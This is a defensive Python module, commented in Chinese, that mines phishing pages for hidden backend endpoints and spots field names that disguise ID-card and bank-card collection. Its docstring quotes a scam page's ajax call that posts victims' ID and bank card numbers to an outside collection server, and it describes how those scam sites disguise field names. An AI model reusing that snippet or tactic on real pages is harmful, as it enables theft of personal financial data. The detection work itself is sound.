"""从页面里挖「后端端点」——不是链接，是数据往哪儿走。

为什么单独做这一层：

现有取证只抓首页 HTML。涉老诈骗站的前端是一张**诱饵页**（"补贴已到账，点击申报"），
真正收身份证和银行卡的是下一跳的表单页，而这个表单页的提交地址往往
**不在任何 `<a href>` 里**，而是写死在 JS：

    $.ajax({ url: 'https://d7k2m.cn/submit.php', type: 'POST',
             data: { username: ..., password: user.idcard,
                     captcha_denglu: user.bankcard } })

实测 np4w53 / hksm38 / bncp24 / gtds85 / mdyj91 / pqzv19 / tfbx42 / xmwk62 /
zqtn56 / jrfy47 十个同模板站，提交端点全部是同一个 `d7k2m.cn/submit.php`。

这就是「主体」：十个域名是一个团伙，一台收单服务器。只记域名等于只记住
了骗子换掉的手机号，没记住他是谁。

另一个证据是**字段名伪装**：`password` 字段收身份证、`captcha_denglu` 收
银行卡号。任何按字段名判断「这是登录页」的扫描器都会放过它。字段名和
placeholder 对不上，本身就是强证据。
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from urllib.parse import urlsplit

# 提交/收集类端点的路径特征。只认这些，不做「所有外链」——
# 一个正常网站的外链有几十个（统计、字体、CDN），全收等于没筛。
_ENDPOINT_PATH = re.compile(
    r"(?:^|/)(?:"
    r"submit|api|post|collect|receive|recv|upload|save|add|create|insert|store"
    r"|report|track|log|visit|admin|login|auth|check|verify|valid|query"
    r"|bind|apply|reg|register|signup|sms|send|sendsms|code|captcha"
    r")(?:[_\-.]|/|$)",
    re.IGNORECASE,
)

# 脚本型端点：比 .html 更像「在收东西」。
_SCRIPT_EXT = re.compile(r"\.(?:php|asp|aspx|jsp|cgi|do|action)(?:$|\?)", re.IGNORECASE)

# 常见第三方：命中就不再往下看。域名后缀匹配，避免漏掉 cdn.xxx.com。
_THIRD_PARTY = (
    "google-analytics.com", "googletagmanager.com", "googleapis.com", "gstatic.com",
    "doubleclick.net", "facebook.net", "facebook.com", "twitter.com", "baidu.com",
    "bdstatic.com", "cnzz.com", "51.la", "umeng.com", "jpush.cn", "getui.com",
    "cloudflare.com", "jsdelivr.net", "unpkg.com", "bootcdn.net", "staticfile.org",
    "bootcss.com", "fontawesome.com", "alicdn.com", "gtimg.com", "qcloud.com",
    "aliyun.com", "aliyuncs.com", "myqcloud.com", "tencent.com", "weixin.qq.com",
    "w3.org", "schema.org", "json-schema.org", "bing.com", "microsoft.com",
    "apple.com", "qq.com", "sogou.com", "so.com", "sm.cn", "umeng.co",
)

# JS 里出现 URL 的几种写法。宁可多匹配再筛，也不要漏掉 url: 这种引号里的。
_JS_URL_PATTERNS = (
    # $.ajax({url:'...'}) / url: "..." / action="..."
    re.compile(r"""(?:url|action|href|src|api|endpoint)\s*[:=]\s*['"]([^'"\s]{6,300})['"]""", re.I),
    # fetch('...') / $.post("...") / .open('POST','...')
    re.compile(r"""(?:fetch|open|post|get|ajax|load)\s*\(\s*['"]([^'"\s]{6,300})['"]""", re.I),
    # location.href='...' / window.open('...')
    re.compile(r"""(?:location\.href|window\.open|location\.replace)\s*[=(]\s*['"]([^'"\s]{6,300})['"]""", re.I),
    # 裸 https:// 域名/路径：兜底，只在疑似脚本块里用
    re.compile(r"""['"](https?://[^'"\s]{6,300})['"]""", re.I),
)

_FORM_ACTION = re.compile(r"""<form\b[^>]*\baction\s*=\s*['"]([^'"]*)['"]""", re.I)
_FORM_TAG = re.compile(r"<form\b[^>]*>", re.I)
# input / textarea / select 一起收：有的站把「卡号」做成 textarea 躲正则。
_INPUT_TAG = re.compile(r"<(?:input|textarea|select)\b[^>]*>", re.I)
_ATTR = re.compile(r"""(\w[\w-]*)\s*=\s*["']([^"']*)["']""")

# 字段名 → 名义含义。用于「字段名说 A、提示语说 B」的伪装识别。
_FIELD_SEMANTICS = {
    "username": "姓名", "name": "姓名", "realname": "姓名", "uname": "姓名",
    "password": "密码", "pwd": "密码", "pass": "密码", "passwd": "密码",
    "idcard": "身份证号", "id_card": "身份证号", "sfz": "身份证号", "idno": "身份证号",
    "cardno": "银行卡号", "bankcard": "银行卡号", "bank_card": "银行卡号", "card": "银行卡号",
    "captcha": "验证码", "code": "验证码", "verify": "验证码", "vcode": "验证码",
    "phone": "手机号", "mobile": "手机号", "tel": "手机号", "sjh": "手机号",
}

# 提示语里的敏感词 → 真实含义。
#
# 按「命中位置最靠右者优先」判定，因为中文的核⼼词在后面：
#   银行卡预留的11位手机号  → 手机号（不是卡号）
#   请输入本人名下有效的借记卡号 → 银行卡号
#   请输入18位有效身份证号码  → 身份证号
_HINT_WORDS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("身份证号", ("身份证号码", "身份证号", "身份证", "证件号码", "证件号", "证件")),
    ("银行卡号", ("银行卡号码", "银行卡号", "借记卡号", "借记卡", "储蓄卡", "银行卡", "卡号")),
    ("手机号", ("手机号码", "手机号", "预留手机", "联系电话", "手机")),
    ("验证码", ("短信验证码", "校验码", "验证码")),
    ("姓名", ("真实姓名", "姓名", "名字")),
    ("密码", ("支付密码", "交易密码", "密码")),
)

# 高价值目标：页面在索要这些，才值得记一条端点证据。
_SENSITIVE = ("身份证号", "银行卡号", "密码", "验证码")


@dataclass
class FormField:
    name: str
    kind: str          # 中文语义：姓名 / 身份证号 / 银行卡号 / 手机号 / 验证码 / 其他
    hint: str          # placeholder / aria-label 原文
    disguised: bool    # 字段名与提示语对不上

    def as_dict(self) -> dict:
        return {"name": self.name, "kind": self.kind, "hint": self.hint[:80], "disguised": self.disguised}


@dataclass
class Endpoint:
    url: str
    method: str = "POST"
    path: str = ""
    host: str = ""
    same_site: bool = False
    fields: list[FormField] = field(default_factory=list)
    via: str = ""      # 从哪儿挖到的：form / js / fetch / redirect

    @property
    def sensitive(self) -> list[str]:
        return [f.kind for f in self.fields if f.kind in _SENSITIVE]

    @property
    def disguised(self) -> list[str]:
        return [f.name for f in self.fields if f.disguised]

    def as_dict(self) -> dict:
        return {
            "url": self.url[:300],
            "method": self.method,
            "host": self.host,
            "same_site": self.same_site,
            "via": self.via,
            "fields": [f.as_dict() for f in self.fields],
            "sensitive": self.sensitive,
            "disguised": self.disguised,
        }


@dataclass
class EndpointReport:
    endpoints: list[Endpoint] = field(default_factory=list)
    # 页面脚本里出现、但不是正常链接的域名。它们是后端/C2 的候选。
    backend_hosts: list[str] = field(default_factory=list)
    forms: int = 0

    def high_value(self) -> list[Endpoint]:
        """只要「在收身份证/银行卡」或「字段名伪装」的端点。"""
        return [e for e in self.endpoints if e.sensitive or e.disguised]

    def as_dict(self) -> dict:
        return {
            "endpoints": [e.as_dict() for e in self.endpoints[:12]],
            "backend_hosts": self.backend_hosts[:12],
            "forms": self.forms,
        }


def _host_of(url: str) -> str:
    try:
        h = (urlsplit(url).hostname or "").lower()
    except ValueError:
        return ""
    return h[4:] if h.startswith("www.") else h


def _is_third_party(host: str) -> bool:
    return any(host == d or host.endswith("." + d) for d in _THIRD_PARTY)


def _normalize(raw: str, base: str) -> str:
    """把 `submit.php`、`//x.cn/a`、`/api/x` 补成绝对地址。"""
    raw = (raw or "").strip()
    if not raw or raw.startswith(("javascript:", "data:", "#", "mailto:", "tel:")):
        return ""
    if raw.startswith("//"):
        return "https:" + raw
    if raw.startswith(("http://", "https://")):
        return raw
    if raw.startswith("/"):
        try:
            parts = urlsplit(base)
            return f"{parts.scheme}://{parts.netloc}{raw}"
        except ValueError:
            return ""
    # 相对路径：只有当它看起来像脚本端点才拼
    if _SCRIPT_EXT.search(raw) or _ENDPOINT_PATH.search("/" + raw):
        try:
            parts = urlsplit(base)
            prefix = parts.path.rsplit("/", 1)[0] if "/" in parts.path else ""
            return f"{parts.scheme}://{parts.netloc}{prefix}/{raw}"
        except ValueError:
            return ""
    return ""


def _attrs(tag: str) -> dict[str, str]:
    return {k.lower(): v for k, v in _ATTR.findall(tag)}


def _hint_kind(hint: str) -> str:
    """从提示语里判真实含义。最靠右命中的优先（中文核心词在后）。"""
    if not hint:
        return ""
    best: tuple[int, int, str] = (-1, -1, "")
    for label, words in _HINT_WORDS:
        for w in words:
            pos = hint.rfind(w)
            if pos < 0:
                continue
            # 位置更靠右的胜；位置相同取更长的词（更具体）
            if pos > best[0] or (pos == best[0] and len(w) > best[1]):
                best = (pos, len(w), label)
    return best[2]


def _field_kind(name: str, hint: str) -> tuple[str, bool]:
    """判定一个输入框「名义上是什么」和「实际在要什么」。

    正常站：name=idcard，placeholder 也说身份证 → 一致。
    诈骗站：name=password，placeholder 说「身份证号码」→ 伪装。
    """
    label = _FIELD_SEMANTICS.get(name.lower().strip(), "")
    hinted = _hint_kind(hint)
    if not label:
        return (hinted or "其他"), False
    if hinted and hinted != label:
        # password 收「身份证号码」——这是最常见的一种伪装
        return hinted, True
    return label, False


def _parse_form(tag: str, body: str) -> tuple[str, str, list[FormField]]:
    a = _attrs(tag)
    action = a.get("action", "")
    method = (a.get("method") or "get").upper()
    fields: list[FormField] = []
    for itag in _INPUT_TAG.findall(body):
        ia = _attrs(itag)
        if (ia.get("type") or "").lower() in ("hidden", "submit", "button", "radio", "checkbox", "reset"):
            continue
        name = ia.get("name") or ia.get("id") or ""
        if not name:
            continue
        hint = ia.get("placeholder") or ia.get("aria-label") or ia.get("title") or ""
        kind, disguised = _field_kind(name, hint)
        fields.append(FormField(name=name, kind=kind, hint=hint, disguised=disguised))
    return action, method, fields


def extract(html: str, base_url: str, *, dom_forms: list[dict] | None = None) -> EndpointReport:
    """从 HTML（可选叠加运行时 DOM 的表单）里挖端点。

    `dom_forms` 是 Playwright 拿到的真实表单结构——比静态正则准，
    但静态解析不能省：很多站把 form 用 JS 拼出来，静态 HTML 里是空的。
    """
    report = EndpointReport()
    html = html or ""
    if not html:
        return report

    base_host = _host_of(base_url)
    found: dict[str, Endpoint] = {}

    def _add(url: str, method: str, via: str, fields: list[FormField] | None = None) -> None:
        if not url:
            return
        parts = urlsplit(url)
        host = (parts.hostname or "").lower()
        if host.startswith("www."):
            host = host[4:]
        if not host:
            return
        if _is_third_party(host):
            return
        path = parts.path or "/"
        same = host == base_host
        # 同站的普通页面不算端点；同站的 .php/.asp 算
        if same and not (_SCRIPT_EXT.search(path) or _ENDPOINT_PATH.search(path)):
            return
        if not same and not (_SCRIPT_EXT.search(path) or _ENDPOINT_PATH.search(path)):
            # 跨域的普通页面：可能是后续跳转，记进 backend_hosts，不当端点
            if host not in report.backend_hosts:
                report.backend_hosts.append(host)
            return
        # 同一个地址只留一条：表单和 JS 常常指向同一个路径，
        # 一个 `action="/post.php"` 会同时被 form 和 js 两路抓到。
        key = url
        ep = found.get(key)
        if ep is None:
            ep = Endpoint(url=url, method=method, path=path, host=host, same_site=same, via=via)
            found[key] = ep
        else:
            if method == "POST":
                ep.method = "POST"
            # 来源取更可信的那个：form > form_dom > js
            rank = {"form": 0, "form_dom": 1, "js": 2, "loose": 3}
            if rank.get(via, 9) < rank.get(ep.via, 9):
                ep.via = via
        if fields:
            known = {(f.name, f.kind) for f in ep.fields}
            for f in fields:
                if (f.name, f.kind) not in known:
                    ep.fields.append(f)

    # 1) 真实表单：静态 + DOM
    for ftag in _FORM_TAG.findall(html):
        start = html.find(ftag)
        body = html[start:start + 4000]
        action, method, fields = _parse_form(ftag, body)
        if any(f.kind in _SENSITIVE for f in fields):
            report.forms += 1
        _add(_normalize(action, base_url), method, "form", fields)

    for form in dom_forms or []:
        action = (form.get("action") or "").strip()
        method = (form.get("method") or "POST").upper()
        names = [str(n) for n in (form.get("inputs") or []) if n]
        fields = [FormField(name=n, kind=_field_kind(n, "")[0], hint="", disguised=False) for n in names]
        _add(_normalize(action, base_url), method, "form_dom", fields)

    # 3) 没有 <form> 包裹的散装字段。
    #    实测 np4w53 的 1.html 就是这种：input 直接摆在 div 里，靠 jQuery 取值提交。
    #    只扫 <form> 内部会一条字段都拿不到，于是「在收身份证」这个最硬的证据丢了。
    loose: list[FormField] = []
    inside_form = {m.start() for m in _FORM_TAG.finditer(html)}
    for m in _INPUT_TAG.finditer(html):
        # 落在某个 <form> 后 4000 字符内的跳过——已由上面处理过
        if any(0 <= m.start() - s < 4000 for s in inside_form):
            continue
        ia = _attrs(m.group(0))
        if (ia.get("type") or "").lower() in (
            "hidden", "submit", "button", "radio", "checkbox", "reset", "search", "file",
        ):
            continue
        name = ia.get("name") or ia.get("id") or ""
        if not name:
            continue
        hint = ia.get("placeholder") or ia.get("aria-label") or ia.get("title") or ""
        kind, disguised = _field_kind(name, hint)
        loose.append(FormField(name=name, kind=kind, hint=hint, disguised=disguised))
    if any(f.kind in _SENSITIVE for f in loose):
        report.forms += 1

    # 2) JS 里的端点
    for pat in _JS_URL_PATTERNS:
        for raw in pat.findall(html):
            url = _normalize(raw, base_url)
            if not url:
                continue
            host = _host_of(url)
            if not host:
                continue
            if _is_third_party(host):
                continue
            path = urlsplit(url).path or "/"
            if host != base_host and not (_SCRIPT_EXT.search(path) or _ENDPOINT_PATH.search(path)):
                if host not in report.backend_hosts:
                    report.backend_hosts.append(host)
                continue
            # 方法：同文件里出现 POST 关键字就当 POST，否则 GET
            method = "POST" if re.search(r"""['"]POST['"]""", html) else "GET"
            _add(url, method, "js")

    # 散装字段挂到最像「收数据」的端点上。
    # 判断顺序：submit 路径 > 脚本后缀 > 任意端点。都不中时，说明页面上有
    # 身份证/银行卡输入框却找不到提交地址——这本身就该留一条记录。
    if loose:
        target = (
            next((e for e in found.values() if "submit" in e.path.lower()), None)
            or next((e for e in found.values() if _SCRIPT_EXT.search(e.path)), None)
            or next(iter(found.values()), None)
        )
        if target is not None:
            known = {(f.name, f.kind) for f in target.fields}
            target.fields.extend(f for f in loose if (f.name, f.kind) not in known)
        else:
            found[f"POST {base_url}"] = Endpoint(
                url=base_url,
                method="POST",
                path=urlsplit(base_url).path or "/",
                host=base_host,
                same_site=True,
                via="loose",
                fields=list(loose),
            )

    report.endpoints = sorted(
        found.values(),
        key=lambda e: (not e.sensitive, not e.disguised, e.same_site, e.url),
    )
    return report
